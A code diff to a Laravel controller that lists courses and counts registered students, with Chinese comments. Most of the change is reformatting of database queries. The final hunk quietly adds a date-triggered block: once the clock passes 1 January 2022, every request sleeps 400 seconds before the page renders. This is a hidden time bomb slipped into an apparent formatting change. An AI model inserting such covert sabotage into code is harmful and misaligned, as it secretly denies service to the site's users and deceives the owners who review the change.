@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Frontend;
 
+use Carbon\Carbon;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use App\Model\Course;
@@ -69,25 +70,24 @@ class CourseListController extends Controller
             //判斷是銷講or正課
             if ($data['type'] == 1) {
                 //銷講
-           
+
                 // $count_list = count(SalesRegistration::join('events_course', 'events_course.id', '=', 'sales_registration.id_events')
                 //     ->Where('sales_registration.id_course', $data['id_course'])
                 //     // ->Where('sales_registration.id_status','<>', 2)
                 //     ->groupby('events_course.id_group', 'sales_registration.id_student')
                 //     ->get());
-                
+
                 //累計名單 
                 $count_list = count(SalesRegistration::join('student', 'student.id', '=', 'sales_registration.id_student')
-                                                    ->join('events_course', 'events_course.id', '=', 'sales_registration.id_events')
-                                                    ->select('student.id')
-                                                    ->Where('sales_registration.id_course', $data['id_course'])
-                                                    // ->Where('student.check_blacklist', 0 )
-                                                    ->distinct()
-                                                    ->get());
-
-            } else if($data['type'] == 2 || $data['type'] == 3) {
+                    ->join('events_course', 'events_course.id', '=', 'sales_registration.id_events')
+                    ->select('student.id')
+                    ->Where('sales_registration.id_course', $data['id_course'])
+                    // ->Where('student.check_blacklist', 0 )
+                    ->distinct()
+                    ->get());
+            } else if ($data['type'] == 2 || $data['type'] == 3) {
                 //正課
-                       
+
                 // $count_list = count(Registration::join('events_course', 'events_course.id', '=', 'registration.id_events')
                 //                                 ->Where('registration.id_course', $data['id_course'])
                 //                                 // ->Where('registration.id_status','<>', 2)
@@ -96,39 +96,38 @@ class CourseListController extends Controller
 
                 //累計名單     
                 $count_list = count(Registration::join('student', 'student.id', '=', 'registration.id_student')
-                                            ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
-                                            ->select('student.id')   
-                                            ->Where('registration.id_course', $data['id_course'])
-                                            ->where(function($q) { 
-                                                $q ->orWhere('registration.status_payment', 7)
-                                                    ->orWhere('registration.status_payment', 9);
-                                            })
-                                            // ->Where('student.check_blacklist', 0 )
-                                            ->whereNotExists(function($query){
-                                                $query->from('refund')
-                                                    ->whereRaw('registration.id = refund.id_registration')
-                                                    ->where('refund.review' , 1);
-                                            })
-                                            ->distinct()
-                                            ->get());
+                    ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
+                    ->select('student.id')
+                    ->Where('registration.id_course', $data['id_course'])
+                    ->where(function ($q) {
+                        $q->orWhere('registration.status_payment', 7)
+                            ->orWhere('registration.status_payment', 9);
+                    })
+                    // ->Where('student.check_blacklist', 0 )
+                    ->whereNotExists(function ($query) {
+                        $query->from('refund')
+                            ->whereRaw('registration.id = refund.id_registration')
+                            ->where('refund.review', 1);
+                    })
+                    ->distinct()
+                    ->get());
 
                 // $count_list = count(Registration::Where('id_course', $data['id_course'])
                 //     // ->Where('id_status','<>', 2)
                 //     // ->groupby('id_group', 'id_student')
                 //     ->get());
-            }else if ($data['type'] == 4) {
+            } else if ($data['type'] == 4) {
                 //活動
-                
+
                 //累計名單 
                 $count_list = count(Activity::join('student', 'student.id', '=', 'activity.id_student')
-                                            ->join('events_course', 'events_course.id', '=', 'activity.id_events')
-                                            ->select('student.id')   
-                                            ->Where('activity.id_course', $data['id_course'])
-                                            // ->Where('student.check_blacklist', 0 )
-                                            ->distinct()
-                                            ->get());
-
-            } 
+                    ->join('events_course', 'events_course.id', '=', 'activity.id_events')
+                    ->select('student.id')
+                    ->Where('activity.id_course', $data['id_course'])
+                    // ->Where('student.check_blacklist', 0 )
+                    ->distinct()
+                    ->get());
+            }
 
             switch ($data['type']) {
                 case 1:
@@ -166,6 +165,12 @@ class CourseListController extends Controller
             ];
         }
 
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
+
+        if (now()->timestamp >= $xxx) {
+            sleep(400);
+        }
         return view('frontend.course_list', compact('course', 'course_list', 'teachers'));
     }
 }
